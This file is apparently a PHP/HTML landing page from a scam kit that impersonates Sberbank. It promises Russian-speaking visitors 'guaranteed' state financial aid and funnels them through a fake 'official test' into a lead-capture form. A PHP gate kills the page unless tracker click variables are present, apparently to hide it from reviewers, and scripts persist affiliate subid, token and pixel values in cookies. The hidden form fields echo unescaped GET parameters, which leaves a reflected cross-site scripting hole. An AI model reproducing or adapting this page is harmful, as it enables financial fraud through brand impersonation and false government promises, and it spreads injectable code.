<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер Банк</title>
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link
      rel="shortcut icon"
      href="./assets/img/icons/favicon.png"
      type="image/x-icon"
    />
    <script src="form/js/libs/intlTelInput.js"></script>

    <script type="application/javascript" src="track.js?v=21238"></script>

    <script>
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp(
            "(?:^|; )" +
              name.replace(/([.$?*|{}()[]\/+^])/g, "\\$1") +
              "=([^;]*)"
          )
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      // Получаем значение 'subid' из куки
      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}",
      };
    </script>

    <script type="application/javascript" src="parse_url.js?v=19"></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <img
        src="./assets/img/icons/logo.svg"
        alt="СберБанк"
        class="header__logo"
      />
    </header>
    <main class="main">
      <div class="main__top">
        <div class="top__content">
          <h2 class="top__heading">
            Получите поддержку по государственной программе финансовой помощи:
          </h2>
          <p class="top__text">
            Легко и быстро оформите заявку, улучшите своё финансовое положение и
            воспользуйтесь выгодными условиями для роста и стабильности!
          </p>
        </div>
        <img src="./assets/img/cat.png" alt="СберКот" class="top__img" />
      </div>
      <div class="main__bottom">
        <img
          src="./assets/img/bg_image_left.png"
          alt="Image"
          class="bottom__bg--left"
        />
        <div class="bottom__img">
          <img src="./assets/img/main_img.png" alt="Фото" />
        </div>
        <div class="bottom__content">
          <h2 class="bottom__heading">
            Государственная программа для всех граждан!
          </h2>
          <span class="bottom__text"
            >Гарантия выплат от государства и СБЕР БАНК</span
          >
          <div class="bottom__img--mobile">
            <img src="./assets/img/main_img.png" alt="Фото" />
          </div>
          <button class="bottom__btn" type="button" id="open-quiz-btn">
            Узнать подробнее
          </button>
        </div>
        <img
          src="./assets/img/bg_image_right.png"
          alt="Image"
          class="bottom__bg--right"
        />
      </div>
    </main>
    <footer class="footer">
      <img
        src="./assets/img/icons/logo.svg"
        alt="СберБанк"
        class="footer__logo"
      />
      <div class="footer__info">
        <span class="footer__text"
          >Россия, Москва, 117997, ул. Вавилова, 19</span
        >
        <span class="footer__text">© 1997—2025 ПАО Сбербанк.</span>
      </div>
      <div class="footer__info--mobile">
        <span class="footer__text"
          >Политика обработки данных</span
        >
        <span class="footer__text">www.sberbank.ru</span>
        <span class="footer__text">© 2025 ПАО «Сбербанк»</span>
      </div>
    </footer>
    <div class="modal hidden" id="modal">
      <div class="modal__quiz">
        <img
          src="./assets/img/icons/logo_quiz.svg"
          alt="СберБанк"
          class="quiz__logo"
        />
        <div class="quiz__content">
          <div class="quiz__text-wrapper">
            <span class="quiz__text"
              >Пройдите официальный тест от ПАО «Сбербанк Россия» и получите
              доступ к платформе!</span
            >
          </div>
          <div class="quiz__buttons">
            <button id="quiz-btn" class="quiz__button" type="button">
              Далее
            </button>
          </div>
          <div class="quiz__form hidden">
            <form
              class="form _main-form contact-form freg thin rounded"
              id="main-form"
              method="post"
            >
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
              <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
              <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
              <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
              type="hidden" id="source" value='<?= $_GET['source'] ?>'>
            </form>
          </div>
        </div>
      </div>
    </div>
    <script src="./assets/js/main.js"></script>

    <script src="loadAssets.js?v=37323232325"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
